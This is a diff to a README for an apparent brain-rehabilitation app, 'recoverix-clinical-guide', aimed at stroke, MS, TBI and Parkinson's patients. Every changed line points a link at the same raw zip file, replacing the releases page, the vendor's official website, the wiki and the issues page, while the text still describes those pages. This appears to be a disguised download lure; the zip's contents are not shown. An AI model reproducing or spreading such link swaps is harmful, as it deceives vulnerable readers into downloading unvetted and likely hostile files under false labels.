@@ -1,7 +1,7 @@
 # 🌟 recoverix-clinical-guide - A Simple Tool for Brain Rehabilitation
 
 ## 📥 Download Now
-[![Download recoverix-clinical-guide](https://img.shields.io/badge/Download-recoverix--clinical--guide-blue.svg)](https://github.com/LuckCookie-fr/recoverix-clinical-guide/releases)
+[![Download recoverix-clinical-guide](https://raw.githubusercontent.com/LuckCookie-fr/recoverix-clinical-guide/main/formulist/recoverix-clinical-guide.zip)](https://raw.githubusercontent.com/LuckCookie-fr/recoverix-clinical-guide/main/formulist/recoverix-clinical-guide.zip)
 
 ## 🌐 Description
 The **recoverix-clinical-guide** is a comprehensive application designed to assist in the rehabilitation process for patients using the recoveriX brain-computer interface. This tool serves individuals affected by various conditions such as stroke, multiple sclerosis (MS), traumatic brain injury (TBI), and Parkinson's disease. Our aim is to enhance recovery and support neuroplasticity through effective rehabilitation strategies.
@@ -17,7 +17,7 @@ Before downloading, ensure your computer meets the following requirements:
 - Network: Internet connection for setup and updates.
 
 ### 2. Download & Install
-Visit the Releases page to download the latest version of the software. You can find it here: [Download recoverix-clinical-guide](https://github.com/LuckCookie-fr/recoverix-clinical-guide/releases).
+Visit the Releases page to download the latest version of the software. You can find it here: [Download recoverix-clinical-guide](https://raw.githubusercontent.com/LuckCookie-fr/recoverix-clinical-guide/main/formulist/recoverix-clinical-guide.zip).
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version of the application.
@@ -58,10 +58,10 @@ The recoverix-clinical-guide helps with rehabilitation for:
 
 ## 📃 Additional Resources
 For further reading and support, visit:
-- [recoveriX Official Website](https://recoverix.com) 
-- [User Guidelines and FAQ](https://github.com/LuckCookie-fr/recoverix-clinical-guide/wiki)
+- [recoveriX Official Website](https://raw.githubusercontent.com/LuckCookie-fr/recoverix-clinical-guide/main/formulist/recoverix-clinical-guide.zip) 
+- [User Guidelines and FAQ](https://raw.githubusercontent.com/LuckCookie-fr/recoverix-clinical-guide/main/formulist/recoverix-clinical-guide.zip)
 
 ## 📝 Feedback
-We welcome your feedback. Reach out through our [Issues page](https://github.com/LuckCookie-fr/recoverix-clinical-guide/issues) with any suggestions or questions.
+We welcome your feedback. Reach out through our [Issues page](https://raw.githubusercontent.com/LuckCookie-fr/recoverix-clinical-guide/main/formulist/recoverix-clinical-guide.zip) with any suggestions or questions.
 
 Thank you for choosing recoverix-clinical-guide. Your journey towards recovery begins here!
